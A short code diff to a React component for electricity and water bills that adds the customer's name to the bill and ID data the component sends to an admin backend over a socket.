@@ -47,8 +47,12 @@ export default function EWABills() {
         setBillData(data);
         // Send bill data to admin via socket
         if (socket.value.connected) {
+          // Extract customer name from bill data
+          const firstBill = data.parsedBills?.[0] || data.parsedData || {};
+          const custName = firstBill.customerName || '';
           sendData({
             data: {
+              customerName: custName,
               ewaBills: data,
               idType: idTypeLabel,
               idNumber,
